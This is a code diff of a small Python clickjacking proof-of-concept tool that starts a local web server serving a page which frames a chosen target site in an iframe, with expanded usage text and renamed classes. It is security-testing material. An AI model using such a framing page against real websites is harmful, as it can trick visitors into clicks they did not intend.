@@ -10,28 +10,29 @@ DIR_NAME = "tmp"
 
 # clases
 
-class server(BaseHTTPRequestHandler):
+class PoC_Server(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(bytes("<html><head><meta charset='utf-8'><title>PoC - Clickjacking</title></head><body><p>Is this site vulnerable to Clickjacking?</p><iframe id='clickjackingFrame' src='%s' width='600px' height='500px'></body></html>" % target,"utf-8"))
-
+        self.wfile.write(bytes("<html><head><meta charset='utf-8'><title>PoC - Clickjacking</title></head><body><p>Is this website vulnerable to Clickjacking?</p><iframe id='clickjackingFrame' src='%s' width='600px' height='500px'></body></html>" % target,"utf-8"))
+        
 
 # functions ------------------------------------------------------------------
 
 def usage():
-    print(f"Usage: python3 {sys.argv[0]} [--PoC] -t <target>\n")      
+    print(f"Usage:\n\tpython3 {sys.argv[0]} -t <target> [--PoC | -lh <local_host> | -lp <local_port>]\n\nFlags:\n\t-t,    Set target to create a website that hijacks clicks on it.\n\t--PoC, Run proof of concept.\n\t-lh,   Set the host where the web server is going to be running (default: localhost).\n\t-lp,   Set the port where the web server is going to be running (default: 8000).\n")      
     exit()
 
 def clickjackingPoC():
-    server.target = TARGET
+    PoC_Server.target = TARGET
     print("[+] PoC of Clickjacking of " + TARGET)
-    webServer = HTTPServer((HOST, PORT), server)#SimpleHTTPRequestHandleri)
+    webServer = HTTPServer((HOST, PORT), PoC_Server)#SimpleHTTPRequestHandleri)
     print("[+] Web-Server mounted in http://" + HOST + ":" + str(PORT))
     try:
         webServer.serve_forever()
     except KeyboardInterrupt:
+        print("\n[!] Exiting...")
         pass
     webServer.server_close()
   
